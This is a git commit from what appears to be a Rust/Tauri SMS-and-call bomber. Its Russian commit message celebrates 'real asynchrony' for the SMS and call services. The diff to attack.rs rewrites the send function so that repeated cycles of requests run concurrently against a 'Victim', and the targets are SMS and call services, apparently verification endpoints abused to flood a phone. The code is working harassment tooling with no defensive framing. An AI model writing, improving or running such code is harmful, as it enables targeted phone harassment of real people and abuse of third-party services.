d2c8d16c1ad219782de9464c4d96689230fd0d48
Эдгар Томский <EdgarKozlov3229@gmail.com>
2024-12-28 22:27:14 +0300

    Ура, теперь настоящая асинхронность с задержкой на сервисах разных типов(СМС и звонки) и циклы.

--- src-tauri/src/attack.rs
+++ src-tauri/src/attack.rs
@@ -1,6 +1,7 @@
 use crate::services::{
     construct_call_services_list, construct_services_list, BodyType, Service, Victim,
 };
+use futures::future::join_all;
 use reqwest::{Client, Method};
 use std::time::Duration;
 
@@ -8,37 +9,45 @@ const SERVICES_DELAY: u64 = 15;
 const CALL_SERVICES_DELAY: u64 = 30;
 
 pub async fn send(victim: Victim, cycles: u64) {
-    for i in 0..cycles {
-        let services = construct_services_list(victim.clone()).await;
-        let services_handles: Vec<_> = services
-            .into_iter()
-            .map(|item| tokio::spawn(send_single(item)))
-            .collect();
+    let mut workers = Vec::new();
 
-        for services_handle in services_handles {
-            services_handle.await.unwrap();
+    let victim_clone = victim.clone();
+    workers.push(tokio::spawn(async move {
+        for i in 0..cycles {
+            let services = construct_services_list(victim_clone.clone()).await;
+            let services_futures: Vec<_> = services
+                .into_iter()
+                .map(|item| tokio::spawn(send_single(item)))
+                .collect();
+
+            join_all(services_futures).await;
+            if i < cycles - 1 {
+                tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
+            }
         }
-        if i < cycles - 1 {
-            tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
-        }
-    }
-    for i in 0..cycles {
-        let call_services = construct_call_services_list(victim.clone()).await;
-        let call_services_handles: Vec<_> = call_services
-            .into_iter()
-            .map(|item| async move {
-                send_single(item).await;
+    }));
+
+    workers.push(tokio::spawn(async move {
+        for i in 0..cycles {
+            let call_services = construct_call_services_list(victim.clone()).await;
+            let call_services_futures: Vec<_> = call_services
+                .into_iter()
+                .map(|item| async move {
+                    send_single(item).await;
+                    tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
+                })
+                .collect();
+
+            for call_services_handle in call_services_futures {
+                call_services_handle.await;
+            }
+            if i < cycles - 1 {
                 tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
-            })
-            .collect();
+            }
+        }
+    }));
 
-        for call_services_handle in call_services_handles {
-            call_services_handle.await;
-        }
-        if i < cycles - 1 {
-            tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
-        }
-    }
+    join_all(workers).await;
 }
 
 async fn send_single(service: Service) {
